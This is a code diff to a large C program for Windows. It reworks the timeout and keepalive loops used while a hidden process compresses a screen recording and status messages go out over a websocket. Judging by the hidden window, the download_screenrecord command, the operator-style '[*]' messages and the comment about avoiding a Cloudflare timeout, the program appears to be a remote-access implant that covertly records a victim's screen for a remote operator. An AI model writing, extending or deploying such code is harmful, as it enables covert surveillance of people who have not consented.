@@ -3430,8 +3430,21 @@ cleanup:
             ZeroMemory(&pi, sizeof(pi));
             
             if (CreateProcessA(NULL, ps_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-                // Wait up to 10 minutes for compression (ffmpeg download can take time)
-                WaitForSingleObject(pi.hProcess, 600000);
+                // Wait for compression with periodic keepalives to prevent connection timeout
+                DWORD wait_result;
+                int wait_loops = 0;
+                while ((wait_result = WaitForSingleObject(pi.hProcess, 2000)) == WAIT_TIMEOUT) {
+                    // Send keepalive every 2 seconds during compression
+                    if (g_connected) {
+                        send_keepalive();
+                    }
+                    wait_loops++;
+                    // Timeout after 10 minutes
+                    if (wait_loops > 300) {
+                        TerminateProcess(pi.hProcess, 1);
+                        break;
+                    }
+                }
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
             }
@@ -3593,18 +3606,21 @@ void download_screenrecord() {
         send_websocket_data("[*] Stopping recording and compressing...\n", 42);
         g_screenrecord_running = 0;
         if (g_screenrecord_thread) {
-            // Wait for recording thread with periodic pings to keep connection alive
+            // Wait for recording thread - it handles its own keepalives during compression
             DWORD wait_result;
             int wait_count = 0;
-            while ((wait_result = WaitForSingleObject(g_screenrecord_thread, 2000)) == WAIT_TIMEOUT) {
-                // Send keepalive data every 2 seconds to prevent Cloudflare timeout
-                send_keepalive();
+            DWORD start_wait = GetTickCount();
+            while ((wait_result = WaitForSingleObject(g_screenrecord_thread, 3000)) == WAIT_TIMEOUT) {
                 wait_count++;
-                if (wait_count % 5 == 0) {
-                    send_websocket_data("[*] Still compressing video...\n", 31);
+                // Only show message after 10 seconds of waiting (not for quick compressions)
+                DWORD elapsed = GetTickCount() - start_wait;
+                if (elapsed > 10000 && wait_count % 3 == 0) {
+                    char wait_msg[64];
+                    sprintf(wait_msg, "[*] Still compressing... (%d sec)\n", elapsed / 1000);
+                    send_websocket_data(wait_msg, strlen(wait_msg));
                 }
-                // Timeout after 5 minutes
-                if (wait_count > 150) {
+                // Timeout after 10 minutes
+                if (wait_count > 200) {
                     send_websocket_data("[!] Compression timed out\n", 26);
                     TerminateThread(g_screenrecord_thread, 0);
                     break;
